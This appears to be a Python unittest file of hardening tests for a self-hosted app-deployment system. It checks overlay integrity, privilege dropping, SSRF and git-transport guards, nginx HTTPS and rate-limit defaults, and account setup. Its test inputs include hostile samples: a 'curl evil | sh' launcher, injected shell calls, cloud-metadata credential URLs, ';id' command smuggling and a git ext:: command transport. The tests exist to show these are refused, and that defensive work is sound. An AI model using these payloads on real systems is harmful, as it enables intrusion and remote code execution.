"""v116 hardening tests (review items #4 onwards). No Docker needed.

    cd ATTa && python3 -m unittest discover -s tests -v

Tests marked "as root" create the unprivileged service users they check (atta-proxy ...) and are skipped
when not run as root. Each test works in throwaway folders; the rest of the machine is not touched."""
import http.client, http.server, importlib.util, io, json, os, pwd, re, shutil, socket, subprocess, sys, tempfile, threading
import time, unittest, zipfile
from pathlib import Path

HERE = Path(__file__).resolve().parent
DEP = HERE.parent / "04-deployment"
TMP = Path(tempfile.mkdtemp(prefix="atta-v116-"))
os.chmod(TMP, 0o711)   # like the server's data folder (3771): passable, not listable
os.environ.setdefault("APP_BUILDER_ROOT", str(TMP / "root"))
os.environ.setdefault("ATTA_ADM_ROOT", str(TMP / "adm"))
for p in (str(DEP), str(DEP / "deployd")):
    if p not in sys.path:
        sys.path.insert(0, p)

import builds, pipeline, app_runner, repair_actions as ra, llm_repair, overlay_integrity as oi, proxy_launch  # noqa: E402

SKINS_ZIP = HERE.parent / "03-ui-skins-capability-package" / "UI_Skin_Capability_OneShot_v2.zip"
AS_ROOT = os.geteuid() == 0 and shutil.which("useradd") and shutil.which("setpriv")


def _package():
    """The delivered skins package, unpacked once (its installer writes real overlays)."""
    pkg = TMP / "package"
    if not (pkg / "out" / "install_all.py").is_file():
        with zipfile.ZipFile(SKINS_ZIP) as z:
            inner = [n for n in z.namelist() if n.endswith("out/install_all.py")]
            if inner:                                   # the zip holds the package directly
                z.extractall(pkg)
    return pkg


def installer():
    os.environ["ATTA_APP_CATALOGUE"] = str(DEP / "app_catalogue.json")
    spec = importlib.util.spec_from_file_location("atta_install_all", _package() / "out" / "install_all.py")
    m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
    return m


def real_overlay(lib: Path, name="gitea") -> Path:
    """An app folder with an overlay written by the real installer, recorded as ATTa's."""
    app = lib / name; app.mkdir(parents=True, exist_ok=True)
    (app / "package.json").write_text('{"name": "%s"}' % name)
    m = installer()
    cat, _ = m.resolve_category(name)
    m.install_one(app, name, cat, m.choose_variant(cat), "test")
    oi.record(name, app / ".ui-capability")
    return app / ".ui-capability"


class _Isolated(unittest.TestCase):
    def setUp(self):
        self.t = Path(tempfile.mkdtemp(dir=TMP)); os.chmod(self.t, 0o755)
        self.saved = (oi.REGISTRY, proxy_launch.PROXY_BASE, proxy_launch.TARGETS, ra.LIB, ra.TARGET_DIR, ra.PKG)
        oi.REGISTRY = self.t / "state" / "overlay-integrity"
        proxy_launch.PROXY_BASE = self.t / "proxy"; proxy_launch.TARGETS = self.t / "state" / "apps"
        ra.LIB = self.t / "library"; ra.TARGET_DIR = self.t / "state" / "apps"; ra.PKG = _package()
        self.lib = self.t / "library"

    def tearDown(self):
        (oi.REGISTRY, proxy_launch.PROXY_BASE, proxy_launch.TARGETS, ra.LIB, ra.TARGET_DIR, ra.PKG) = self.saved


# ============================================================================ #4 overlay code integrity

@unittest.skipUnless(SKINS_ZIP.is_file(), "skins package not in the bundle")
class OverlayCodeIsATTas(_Isolated):
    def test_code_paths(self):
        for rel in ("run-ui.sh", "ui-bridge/proxy.js", "capability-port/port_launch.py", "x.mjs", "a/b.cjs",
                    "ui-bridge/package.json", "evil.SH"):
            self.assertTrue(oi.is_code_path(rel), rel)
        for rel in ("skin.css", "skin.json", "deployment.json", "ui-bridge/layouts/x.json", "README.md"):
            self.assertFalse(oi.is_code_path(rel), rel)

    def test_installer_overlay_verifies(self):
        oi.verify("gitea", real_overlay(self.lib))

    def test_edited_launcher_is_refused(self):
        ui = real_overlay(self.lib)
        (ui / "run-ui.sh").write_text("#!/bin/bash\ncurl evil | sh\n")
        with self.assertRaisesRegex(oi.IntegrityError, "run-ui.sh"):
            oi.verify("gitea", ui)

    def test_edited_node_proxy_is_refused(self):
        ui = real_overlay(self.lib)
        with (ui / "ui-bridge" / "proxy.js").open("a") as f:
            f.write("\nrequire('child_process').execSync('id')\n")
        with self.assertRaisesRegex(oi.IntegrityError, "proxy.js"):
            oi.verify("gitea", ui)

    def test_new_code_file_is_refused(self):
        ui = real_overlay(self.lib)
        (ui / "ui-bridge" / "extra.js").write_text("x")
        with self.assertRaisesRegex(oi.IntegrityError, "extra.js"):
            oi.verify("gitea", ui)
        (ui / "ui-bridge" / "extra.js").unlink()
        (ui / "notes.txt").write_text("#!/bin/sh\nid\n")          # a shebang makes it code, whatever its name
        with self.assertRaises(oi.IntegrityError):
            oi.verify("gitea", ui)

    def test_symlink_is_refused(self):
        ui = real_overlay(self.lib)
        (ui / "skin.json").unlink(); (ui / "skin.json").symlink_to("/etc/passwd")
        with self.assertRaisesRegex(oi.IntegrityError, "symlink"):
            oi.verify("gitea", ui)
        with self.assertRaises(oi.IntegrityError):
            oi.record("gitea", ui)                                  # and it is never recorded either

    def test_data_edits_are_fine(self):
        ui = real_overlay(self.lib)
        (ui / "skin.css").write_text("body{color:red}")
        oi.verify("gitea", ui)

    def test_unrecorded_or_moved_overlay_is_refused(self):
        ui = real_overlay(self.lib)
        oi.forget("gitea")
        with self.assertRaisesRegex(oi.IntegrityError, "no integrity record"):
            oi.verify("gitea", ui)
        oi.record("gitea", ui)
        moved = self.t / "elsewhere"; shutil.copytree(ui, moved)
        with self.assertRaisesRegex(oi.IntegrityError, "moved"):
            oi.verify("gitea", moved)


@unittest.skipUnless(SKINS_ZIP.is_file(), "skins package not in the bundle")
class SelfHealerNeverWritesCode(_Isolated):
    def setUp(self):
        super().setUp()
        self.ui = real_overlay(self.lib)

    def test_write_overlay_file_refuses_code(self):
        for rel in ("run-ui.sh", "ui-bridge/proxy.js", "capability-port/../ui-bridge/pick-app.js",
                    "new.sh", "ui-bridge/package.json", "x.py"):
            with self.assertRaises(ra.ActionError, msg=rel):
                ra.write_overlay_file("gitea", rel, "#!/bin/sh\nid\n")
        oi.verify("gitea", self.ui)                              # nothing changed

    def test_write_overlay_file_still_fixes_data(self):
        self.assertIn("wrote skin.css", ra.write_overlay_file("gitea", "skin.css", "body{}"))
        oi.verify("gitea", self.ui)

    def test_patch_overlay_file_refuses_code(self):
        with self.assertRaisesRegex(ra.ActionError, "code ATTa runs"):
            ra.patch_overlay_file("gitea", "run-ui.sh", "set -euo pipefail", "set -euo pipefail; id")

    def test_reinstall_records_the_installers_copy(self):
        (self.ui / "run-ui.sh").write_text("#!/bin/sh\nid\n")
        with self.assertRaises(oi.IntegrityError):
            oi.verify("gitea", self.ui)
        ra.reinstall_app_overlay("gitea")
        oi.verify("gitea", self.ui)                              # clean installer copy, recorded
        self.assertNotIn("\nid\n", (self.ui / "run-ui.sh").read_text())


class LLMTierHasItsOwnSwitch(unittest.TestCase):
    def setUp(self):
        self.saved = dict(os.environ)
        os.environ["ANTHROPIC_API_KEY"] = "sk-ant-" + "k" * 40      # the Front Door's key is set

    def tearDown(self):
        os.environ.clear(); os.environ.update(self.saved)

    def test_key_alone_does_not_turn_it_on(self):
        os.environ.pop("APP_BUILDER_HEAL_LLM", None)
        ok, why = llm_repair.available()
        self.assertFalse(ok); self.assertIn("APP_BUILDER_HEAL_LLM", why)
        os.environ["APP_BUILDER_HEAL_LLM"] = "false"
        self.assertFalse(llm_repair.available()[0])

    def test_switch_on_passes_the_gate(self):
        os.environ["APP_BUILDER_HEAL_LLM"] = "true"
        ok, why = llm_repair.available()
        self.assertNotIn("APP_BUILDER_HEAL_LLM", why)            # later checks (package installed) may still say no


class UploadsCannotShipAnOverlay(unittest.TestCase):
    def test_strip_foreign_overlays(self):
        app = TMP / "upl" / "shop"; (app / ".ui-capability").mkdir(parents=True)
        (app / ".ui-capability" / "run-ui.sh").write_text("#!/bin/sh\nid\n")
        (app / "sub" / ".ui-capability").mkdir(parents=True)
        (app / "index.html").write_text("<h1>shop</h1>")
        gone = pipeline.strip_foreign_overlays(app)
        self.assertEqual(len(gone), 2)
        self.assertFalse(any(app.rglob(".ui-capability")))
        self.assertTrue((app / "index.html").is_file())

    def test_record_overlays_only_blesses_installer_output(self):
        saved = oi.REGISTRY; oi.REGISTRY = TMP / "reg-only"
        try:
            ready = TMP / "rec" / "ready"; pend = TMP / "rec" / "pending"
            for d in (ready, pend):
                (d / ".ui-capability").mkdir(parents=True)
                (d / ".ui-capability" / "run-ui.sh").write_text("#!/bin/sh\n")
            rec = builds.create("admin", origin="web")
            pipeline.record_overlays({"apps": [{"path": str(ready), "status": "READY"}],
                                      "pending_review": [{"path": str(pend), "status": "PENDING_REVIEW"}]}, rec["id"])
            self.assertTrue((oi.REGISTRY / "ready.json").is_file())
            self.assertFalse((oi.REGISTRY / "pending.json").exists())
        finally:
            oi.REGISTRY = saved


# ---------------------------------------------------------------------------- the proxy itself, as root

SINK = open(os.devnull, "w")


class _Quiet(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *a):
        pass


def _free_port():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0)); return s.getsockname()[1]


def ensure_user(name, groups=()):
    try:
        pwd.getpwnam(name)
    except KeyError:
        subprocess.run(["useradd", "--system", "--no-create-home", "--shell", "/usr/sbin/nologin", name], check=True)
    for g in groups:
        subprocess.run(["usermod", "-aG", g, name], check=True)
    return pwd.getpwnam(name)


def proc_status(pid):
    d = {}
    for line in Path(f"/proc/{pid}/status").read_text().splitlines():
        k, _, v = line.partition(":"); d[k] = v.split()
    return d


@unittest.skipUnless(AS_ROOT and SKINS_ZIP.is_file() and shutil.which("node"), "needs root, useradd, setpriv and node")
class SkinProxyRunsUnprivileged(_Isolated):
    """The real installer overlay, the real node proxy, a real unprivileged user (as root)."""
    def setUp(self):
        super().setUp()
        self.user = ensure_user("atta-proxy")
        self.ui = real_overlay(self.lib)
        self.port = _free_port()
        # a stand-in for the started app
        self.app_srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _Quiet)
        threading.Thread(target=self.app_srv.serve_forever, daemon=True).start()
        self.target = f"http://127.0.0.1:{self.app_srv.server_address[1]}/"
        self.saved_env = dict(os.environ)
        os.environ.update(APP_BUILDER_SESSION_SECRET="atta-session-" + "s" * 30, ANTHROPIC_API_KEY="sk-ant-atta-" + "a" * 30)

    def tearDown(self):
        proxy_launch.stop("gitea")
        self.app_srv.shutdown(); self.app_srv.server_close()
        os.environ.clear(); os.environ.update(self.saved_env)
        super().tearDown()

    def _pid(self):
        return int((proxy_launch.proxy_dir("gitea") / "run" / "proxy.pid").read_text())

    def test_proxy_runs_as_the_proxy_user_with_no_secrets(self):
        t = proxy_launch.launch("gitea", self.ui, self.target, self.port, SINK)
        pid = self._pid()
        st = proc_status(pid)
        self.assertEqual(int(st["Uid"][0]), self.user.pw_uid)            # real uid
        self.assertEqual(int(st["Uid"][1]), self.user.pw_uid)            # effective uid
        self.assertNotIn(str(os.getgid()), st["Groups"] if len(st["Groups"]) else [])
        env = Path(f"/proc/{pid}/environ").read_bytes()
        self.assertNotIn(b"atta-session-", env); self.assertNotIn(b"sk-ant-atta-", env)
        self.assertIn(b"TARGET_URL=" + self.target.encode(), env)
        self.assertIn(b"node", Path(f"/proc/{pid}/cmdline").read_bytes())
        # registered the way the watcher expects: pointing at the library overlay, not the copy
        self.assertEqual(t["ui_dir"], str(self.ui))
        reg = json.loads((proxy_launch.TARGETS / "gitea.json").read_text())
        self.assertEqual(reg["proxy_url"], f"http://127.0.0.1:{self.port}/")
        # and it really serves
        with socket.create_connection(("127.0.0.1", self.port), timeout=5) as c:
            c.sendall(b"GET / HTTP/1.0\r\nHost: x\r\n\r\n"); self.assertIn(b"HTTP/", c.recv(64))

    def test_proxy_cannot_read_the_library(self):
        (self.lib / "gitea" / ".env").write_text("STRIPE_SECRET_KEY=sk_live_customer\n")
        os.chmod(self.lib / "gitea" / ".env", 0o600)
        proxy_launch.launch("gitea", self.ui, self.target, self.port, SINK)
        r = subprocess.run(["setpriv", f"--reuid={self.user.pw_uid}", f"--regid={self.user.pw_gid}", "--init-groups",
                            "cat", str(self.lib / "gitea" / ".env")], capture_output=True)
        self.assertNotEqual(r.returncode, 0)

    def test_tampered_launcher_is_never_started(self):
        (self.ui / "run-ui.sh").write_text("#!/bin/bash\ntouch /tmp/atta-pwned-by-launcher\n")
        with self.assertRaisesRegex(proxy_launch.LaunchError, "differs"):
            proxy_launch.launch("gitea", self.ui, self.target, self.port, SINK)
        self.assertFalse(Path("/tmp/atta-pwned-by-launcher").exists())
        self.assertFalse(proxy_launch._port_open(self.port))

    def test_stop_ends_it(self):
        proxy_launch.launch("gitea", self.ui, self.target, self.port, SINK)
        pid = self._pid()
        proxy_launch.stop("gitea")
        alive = lambda: Path(f"/proc/{pid}").exists() and proc_status(pid).get("State", ["?"])[0] != "Z"
        for _ in range(20):
            if not alive():
                break
            time.sleep(0.2)
        self.assertFalse(alive())
        self.assertFalse(Path(f"/proc/{pid}").exists())          # and reaped: no zombie left behind
        self.assertFalse(proxy_launch._port_open(self.port))

    def test_bad_target_is_refused(self):
        for bad in ("http://169.254.169.254/", "http://127.0.0.1:1/;id", "file:///etc/passwd"):
            with self.assertRaises(proxy_launch.LaunchError):
                proxy_launch.launch("gitea", self.ui, bad, self.port, SINK)


# ============================================================================ #5 services as their own users

import accounts  # noqa: E402
from adm import config as adm_config, queue as adm_queue, authz  # noqa: E402


class WebSystemUpdatesGoThroughDeployd(unittest.TestCase):
    """The non-root pipeline hands web-uploaded bundles to deployd, which queues each as a WEB job."""
    def setUp(self):
        self.t = Path(tempfile.mkdtemp(dir=TMP))
        self.saved = (pipeline.ADM_REQUESTS, adm_config.REQUESTS, adm_config.TRUSTED_UID, authz.USERS_FILE)
        pipeline.ADM_REQUESTS = adm_config.REQUESTS = self.t / "requests"
        adm_config.REQUESTS.mkdir(); os.chmod(adm_config.REQUESTS, 0o700)
        adm_config.TRUSTED_UID = os.getuid(); adm_config.ensure_dirs()
        authz.USERS_FILE = accounts.USERS_FILE
        d = {"users": {"admin": {"name": "admin", "role": "admin"}, "tester01": {"name": "tester01", "role": "user"}}}
        accounts.USERS_FILE.parent.mkdir(parents=True, exist_ok=True); accounts.USERS_FILE.write_text(json.dumps(d))
        self.bundle = self.t / "ATTa.zip"
        with zipfile.ZipFile(self.bundle, "w") as z:
            z.writestr("x", "y")

    def tearDown(self):
        (pipeline.ADM_REQUESTS, adm_config.REQUESTS, adm_config.TRUSTED_UID, authz.USERS_FILE) = self.saved
        for m in adm_queue.pending():
            adm_queue.finish(m)

    def job(self, jid):
        return [m for m in adm_queue.pending() if m["job_id"] == jid][0]

    def test_request_becomes_a_web_job(self):
        pipeline.request_system_update(self.bundle, "b-20260925-000000-aaaaaaaa", "admin", "ATTa-deploy116.zip")
        self.assertTrue((adm_config.REQUESTS / "b-20260925-000000-aaaaaaaa.json").is_file())
        jobs = adm_queue.sweep_requests()
        self.assertEqual(len(jobs), 1)
        m = self.job(jobs[0])
        self.assertEqual((m["origin"], m["requested_by"], m["build_id"]), ("web", "admin", "b-20260925-000000-aaaaaaaa"))
        self.assertTrue(authz.allowed(m)[0])
        self.assertEqual(list(adm_config.REQUESTS.iterdir()), [])           # consumed

    def test_request_is_never_local_and_non_admin_is_refused(self):
        pipeline.request_system_update(self.bundle, "b-20260925-000000-bbbbbbbb", "tester01", "x.zip")
        m = self.job(adm_queue.sweep_requests()[0])
        self.assertEqual(m["origin"], "web")
        ok, why = authz.allowed(m)
        self.assertFalse(ok); self.assertIn("not an admin", why)

    def test_malformed_and_linked_requests_are_discarded(self):
        r = adm_config.REQUESTS
        (r / "a.json").write_text(json.dumps({"archive": "a.zip"})); shutil.copy(self.bundle, r / "a.zip")   # no account
        (r / "b.json").write_text(json.dumps({"archive": "b.zip", "requested_by": "admin"}))
        (r / "b.zip").symlink_to(self.bundle)                                                            # a link
        (r / "c.json").write_text(json.dumps({"archive": "other.zip", "requested_by": "admin"}))
        shutil.copy(self.bundle, r / "c.zip")                                                            # wrong name
        self.assertEqual(adm_queue.sweep_requests(), [])
        self.assertEqual(sorted(p.name for p in r.iterdir()), [])

    def test_shared_request_folder_is_ignored(self):
        pipeline.request_system_update(self.bundle, "b-20260925-000000-cccccccc", "admin", "x.zip")
        os.chmod(adm_config.REQUESTS, 0o777)
        try:
            self.assertEqual(adm_queue.sweep_requests(), [])
        finally:
            os.chmod(adm_config.REQUESTS, 0o700)

    def test_non_root_pipeline_hands_over_instead_of_queueing(self):
        rec = builds.create("admin", origin="web")
        stage = self.t / "stage"; (stage / "04-deployment").mkdir(parents=True)
        (stage / "run").write_text(""); (stage / "release.json").write_text("{}")
        (stage / "04-deployment" / "bootstrap.sh").write_text("")
        real_euid, real_isdir = os.geteuid, Path.is_dir
        os.geteuid = lambda: 1000
        Path.is_dir = lambda self: True if str(self) == "/run/systemd/system" else real_isdir(self)
        try:
            out = pipeline.queue_system_update(self.bundle, stage, rec["id"], builds.get(rec["id"]))
        finally:
            os.geteuid, Path.is_dir = real_euid, real_isdir
        self.assertEqual(out, rec["id"])
        self.assertEqual(builds.get(rec["id"])["adm"]["request"], rec["id"])
        self.assertTrue((adm_config.REQUESTS / f"{rec['id']}.json").is_file())


class FilesKeepTheirOwnersAcrossRewrites(unittest.TestCase):
    def test_build_records_are_group_readable(self):
        import stat as st
        rec = builds.create("admin", origin="web")
        self.assertEqual(st.S_IMODE(builds.path(rec["id"]).stat().st_mode), 0o640)

    @unittest.skipUnless(os.geteuid() == 0, "needs root to hand the file to another owner")
    def test_accounts_file_keeps_owner_group_and_mode_when_root_rewrites_it(self):
        import stat as st
        accounts.save({"schema": "APP_BUILDER_USERS.v1", "users": {}})
        os.chown(accounts.USERS_FILE, 4242, 4343); os.chmod(accounts.USERS_FILE, 0o640)
        accounts.save({"schema": "APP_BUILDER_USERS.v1", "users": {"x": {}}})
        s2 = accounts.USERS_FILE.stat()
        self.assertEqual((s2.st_uid, s2.st_gid, st.S_IMODE(s2.st_mode)), (4242, 4343, 0o640))
        os.chown(accounts.USERS_FILE, 0, 0)


# ============================================================================ #7 HTTPS by default, #13 nginx limits

import socket as _socket  # noqa: E402

LIBSH = DEP / "bootstrap-lib.sh"


def libsh(script):
    return subprocess.run(["bash", "-c", f'set -u; . "{LIBSH}"\n{script}'], capture_output=True, text=True,
                          env={**os.environ, "ATTA_LIB_DIR": str(DEP)}, timeout=60)


class NginxListensPubliclyOnlyWithHttps(unittest.TestCase):
    """v117: the site is rendered whole by nginx_site.py (tests/test_v117_nginx.py has the full set); the v116
    guarantees are kept and checked here: public only with HTTPS (or an explicit opt-out), values never pasted raw."""
    def listen(self, domains, email, allow=False):
        import nginx_site
        site, desc = nginx_site.render(8787, nginx_site.domains_of(domains) if domains not in ("", "_") else [], email,
                                       allow, "/nonexistent", "/var/lib/atta-acme", ipv6=False)
        return desc["mode"], site

    def test_listen_choice(self):
        self.assertEqual(self.listen("", "")[0], "local")                           # nothing set: local only
        self.assertEqual(self.listen("_", "a@b.co")[0], "local")
        self.assertEqual(self.listen("", "", True)[0], "public")                    # explicit opt-out only
        mode, site = self.listen("atta.example.com", "a@b.co")                      # certbot can prove the domain...
        self.assertEqual(mode, "pending")
        self.assertIn("listen 127.0.0.1:80 default_server", site)                  # ...but the login stays local
        self.assertIn("return 503", site)
        import nginx_site
        with self.assertRaises(nginx_site.SiteError):                              # no email, no certificate
            self.listen("atta.example.com", "")

    def test_rendered_values_are_checked(self):
        import nginx_site
        for bad in ("evil;} server {", "0.0.0.0:80", "a b;c"):
            with self.subTest(bad=bad), self.assertRaises(nginx_site.SiteError):
                nginx_site.domains_of(bad)
        mode, site = self.listen("a.example.com www.a.example.com", "a@b.co")
        self.assertIn("server_name a.example.com www.a.example.com;", site)
        self.assertNotIn("__", site)


@unittest.skipUnless(shutil.which("nginx") and os.geteuid() == 0, "needs nginx (and root to run it)")
class RealNginx(unittest.TestCase):
    """The rendered site, loaded by the real nginx: syntax in every mode, then the rate limits live."""
    def setUp(self):
        self.t = Path(tempfile.mkdtemp(dir=TMP)); os.chmod(self.t, 0o755)

    def main_conf(self, site):
        (self.t / "site.conf").write_text(site)
        conf = self.t / "nginx.conf"
        conf.write_text(f"daemon off; pid {self.t}/nginx.pid; error_log {self.t}/error.log;\n"
                        f"events {{}}\nhttp {{ access_log off; client_body_temp_path {self.t}/body;\n"
                        f"proxy_temp_path {self.t}/proxy; include {self.t}/site.conf; }}\n")
        return conf

    def render(self, backend_port, http_port, allow_public_http):
        import nginx_site
        site, _ = nginx_site.render(backend_port, [], "", allow_public_http, self.t / "le", self.t / "acme",
                                    http_port=http_port, ipv6=False)
        return site

    def test_both_modes_pass_nginx_t(self):
        for allow in (False, True):
            conf = self.main_conf(self.render(8787, 80, allow))
            r = subprocess.run(["nginx", "-t", "-c", str(conf)], capture_output=True, text=True)
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertNotIn("[warn]", r.stderr)

    def test_login_and_upload_are_rate_limited(self):
        # v117: this server's own checks (from loopback) are not counted, so the limits are exercised from the
        # machine's other address — the way a real client reaches it.
        ip = next((a for a in _socket.gethostbyname_ex(_socket.gethostname())[2] if not a.startswith("127.")), None)
        if not ip:
            self.skipTest("no non-loopback address to send from")
        bport = _free_port()
        backend = http.server.ThreadingHTTPServer(("127.0.0.1", bport), _Quiet)
        threading.Thread(target=backend.serve_forever, daemon=True).start()
        port = _free_port()
        conf = self.main_conf(self.render(bport, port, True))
        ngx = subprocess.Popen(["nginx", "-c", str(conf)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        try:
            for _ in range(50):
                if proxy_launch._port_open(port):
                    break
                time.sleep(0.1)

            def code(path, host=ip):
                c = http.client.HTTPConnection(host, port, timeout=5, source_address=(host, 0))
                try:
                    c.request("GET", path); return c.getresponse().status
                finally:
                    c.close()
            login = [code("/login") for _ in range(12)]
            self.assertEqual(login[:6].count(429), 0, login)          # 1 + burst 5 get through
            self.assertIn(429, login[6:], login)                     # then the limit answers
            upload = [code("/upload") for _ in range(8)]
            self.assertIn(429, upload, upload)
            self.assertNotIn(429, [code("/") for _ in range(20)])      # ordinary pages are not limited
            self.assertNotIn(429, [code("/login", "127.0.0.1") for _ in range(12)])   # this server's own checks
        finally:
            ngx.terminate(); ngx.wait(timeout=10)
            backend.shutdown(); backend.server_close()


# ============================================================================ #8 no fetching inside the network

import netguard, upstream  # noqa: E402


class _FakeDNS:
    """getaddrinfo stand-in: names map to fixed addresses; anything else really resolves (numeric forms)."""
    def __init__(self, table):
        self.table, self.real = table, _socket.getaddrinfo

    def __call__(self, host, *a, **k):
        if host in self.table:
            ip = self.table[host]
            fam = _socket.AF_INET6 if ":" in ip else _socket.AF_INET
            return [(fam, _socket.SOCK_STREAM, 6, "", (ip, 0))]
        return self.real(host, *a, **k)

    def __enter__(self):
        _socket.getaddrinfo = self; return self

    def __exit__(self, *e):
        _socket.getaddrinfo = self.real


DNS = {"github.com": "140.82.112.3", "gitlab.com": "172.65.251.78", "docs.example.org": "93.184.215.14",
       "evil-internal.example.org": "10.0.0.5", "rebind.example.org": "169.254.169.254",
       "v6-local.example.org": "::1"}


class GitAddressesStayPublic(unittest.TestCase):
    def test_allowed_public_hosts(self):
        with _FakeDNS(DNS):
            self.assertEqual(netguard.check_repo_url("https://github.com/go-gitea/gitea"), "https://github.com/go-gitea/gitea")
            netguard.check_repo_url("https://gitlab.com/o/r.git")

    def test_refused(self):
        with _FakeDNS({**DNS, "github.com": "10.1.2.3"}):
            for url in ("https://169.254.169.254/latest/meta-data", "https://127.0.0.1/x/y", "https://localhost/x/y",
                        "https://evil-internal.example.org/o/r", "http://github.com/o/r", "https://github.com/o/r",
                        "ssh://git@github.com/o/r", "https://github.com/o/r;id", "file:///etc/passwd"):
                with self.assertRaises(netguard.Refused, msg=url):
                    netguard.check_repo_url(url)

    def test_hosts_are_configurable(self):
        saved = os.environ.get("APP_BUILDER_GIT_HOSTS")
        os.environ["APP_BUILDER_GIT_HOSTS"] = "git.example.org"
        try:
            with _FakeDNS({**DNS, "git.example.org": "93.184.215.20"}):
                netguard.check_repo_url("https://git.example.org/team/app")
                with self.assertRaises(netguard.Refused):
                    netguard.check_repo_url("https://github.com/o/r")
        finally:
            if saved is None:
                os.environ.pop("APP_BUILDER_GIT_HOSTS", None)
            else:
                os.environ["APP_BUILDER_GIT_HOSTS"] = saved

    def test_pipeline_refuses_before_cloning(self):
        with _FakeDNS(DNS), self.assertRaisesRegex(RuntimeError, "not an allowed git host"):
            pipeline.ingest_repo("https://evil-internal.example.org/o/r", "b-x", "admin")

    def test_git_commands_are_https_only(self):
        c = netguard.git_clone_cmd("https://github.com/o/r", "/tmp/x", "--depth", "1")
        for flag in ("protocol.allow=never", "protocol.https.allow=always", "core.hooksPath=/dev/null",
                     "submodule.recurse=false", "--no-recurse-submodules"):
            self.assertIn(flag, c)
        self.assertEqual(c[-3:], ["--", "https://github.com/o/r", "/tmp/x"])
        self.assertNotIn("APP_BUILDER_SESSION_SECRET", netguard.git_env({"PATH": "/bin", "APP_BUILDER_SESSION_SECRET": "x"}))

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_real_git_refuses_other_transports(self):
        src = Path(tempfile.mkdtemp(dir=TMP)) / "repo"
        subprocess.run(["git", "init", "-q", str(src)], check=True)
        for url in (f"file://{src}", "ext::sh -c touch% /tmp/atta-git-ext-pwned"):
            dest = Path(tempfile.mkdtemp(dir=TMP)) / "out"
            r = subprocess.run(netguard.git_clone_cmd(url, dest), capture_output=True, text=True,
                               env=netguard.git_env(), timeout=60)
            self.assertNotEqual(r.returncode, 0, url)
            self.assertIn("not allowed", r.stderr + r.stdout, url)
        self.assertFalse(Path("/tmp/atta-git-ext-pwned").exists())


class DocumentationFetchesStayPublic(unittest.TestCase):
    def test_internal_pages_are_refused(self):
        with _FakeDNS(DNS):
            for url in ("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                        "http://127.0.0.1:8787/api/builds", "http://localhost/", "http://[::1]/", "http://[::ffff:127.0.0.1]/",
                        "http://2130706433/", "http://0x7f000001/", "http://0/", "http://rebind.example.org/",
                        "http://v6-local.example.org/", "http://evil-internal.example.org/", "http://metadata.google.internal/",
                        "https://docs.example.org:8443/", "http://user:pw@docs.example.org/", "ftp://docs.example.org/",
                        "http://no-such-host.invalid/"):
                with self.assertRaises(netguard.Refused, msg=url):
                    netguard.check_fetch_url(url)
            netguard.check_fetch_url("https://docs.example.org/install/docker")

    def test_redirect_into_the_network_is_not_followed(self):
        h = netguard._CheckedRedirects()
        with _FakeDNS(DNS), self.assertRaises(netguard.Refused):
            h.redirect_request(None, None, 302, "Found", {}, "http://169.254.169.254/latest/meta-data/")

    def test_upstream_really_does_not_fetch_a_local_page(self):
        srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _Quiet)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        hits = []
        orig = _Quiet.do_GET
        _Quiet.do_GET = lambda self: (hits.append(self.path), orig(self))[1]
        try:
            self.assertEqual(upstream._get(f"http://127.0.0.1:{srv.server_address[1]}/"), "")
            self.assertEqual(hits, [])                                   # no request ever reached it
        finally:
            _Quiet.do_GET = orig
            srv.shutdown(); srv.server_close()


# ============================================================================ #9 #11 #12 #13 #14 #16 gateway + accounts

import urllib.error, urllib.request  # noqa: E402


def load_gateway():
    os.environ.setdefault("APP_BUILDER_SESSION_SECRET", "test-session-secret-" + "x" * 32)
    if not accounts.load()["users"]:
        accounts.create("admin", "admin", "correct horse battery staple")
    import gateway
    return gateway


def set_users(**roles):
    d = {"schema": "APP_BUILDER_USERS.v1", "users": {}}
    for name, role in roles.items():
        d["users"][name] = {"name": name, "role": role, "session_version": 1,
                            "password": accounts.make_hash("pw-" + name + "-0123456789")}
    accounts.save(d)


class TestAccountsAreOptIn(unittest.TestCase):
    def setUp(self):
        self.saved = (accounts.TEST_ACCOUNT_COUNT, accounts.TEST_ACCOUNTS_FILE, os.environ.get("APP_BUILDER_PASSWORD"))
        accounts.TEST_ACCOUNTS_FILE = Path(tempfile.mkdtemp(dir=TMP)) / "TEST_ACCOUNTS.txt"
        accounts.save({"schema": "APP_BUILDER_USERS.v1", "users": {}})

    def tearDown(self):
        accounts.TEST_ACCOUNT_COUNT, accounts.TEST_ACCOUNTS_FILE, pw = self.saved
        os.environ.pop("APP_BUILDER_PASSWORD", None)
        if pw is not None:
            os.environ["APP_BUILDER_PASSWORD"] = pw

    def test_server_default_is_admin_only(self):
        accounts.TEST_ACCOUNT_COUNT = 0
        made = accounts.init()
        self.assertEqual([m[0] for m in made], [accounts.ADMIN_NAME])
        self.assertEqual(list(accounts.load()["users"]), [accounts.ADMIN_NAME])

    def test_testers_only_when_asked(self):
        accounts.TEST_ACCOUNT_COUNT = 3
        self.assertEqual(sorted(accounts.load()["users"]) + sorted(m[0] for m in accounts.init()),
                         ["admin", "tester01", "tester02", "tester03"])

    def test_env_default_is_zero(self):
        r = subprocess.run([sys.executable, "-c", "import accounts; print(accounts.TEST_ACCOUNT_COUNT)"], cwd=DEP,
                           capture_output=True, text=True, env={k: v for k, v in os.environ.items() if k != "APP_BUILDER_TEST_ACCOUNTS"})
        self.assertEqual(r.stdout.strip(), "0")

    def test_short_legacy_password_is_not_reused(self):
        accounts.TEST_ACCOUNT_COUNT = 0
        os.environ["APP_BUILDER_PASSWORD"] = "admin123"
        (_, _, pw), = accounts.init()
        self.assertNotEqual(pw, "admin123")
        self.assertIsNone(accounts.verify("admin", "admin123"))

    def test_long_legacy_password_is_kept(self):
        accounts.TEST_ACCOUNT_COUNT = 0
        os.environ["APP_BUILDER_PASSWORD"] = "a-long-shared-password-2024"
        accounts.init()
        self.assertIsNotNone(accounts.verify("admin", "a-long-shared-password-2024"))

    def test_delete(self):
        set_users(admin="admin", tester01="user")
        accounts.delete("tester01")
        self.assertIsNone(accounts.get("tester01"))
        with self.assertRaisesRegex(ValueError, "last enabled admin"):
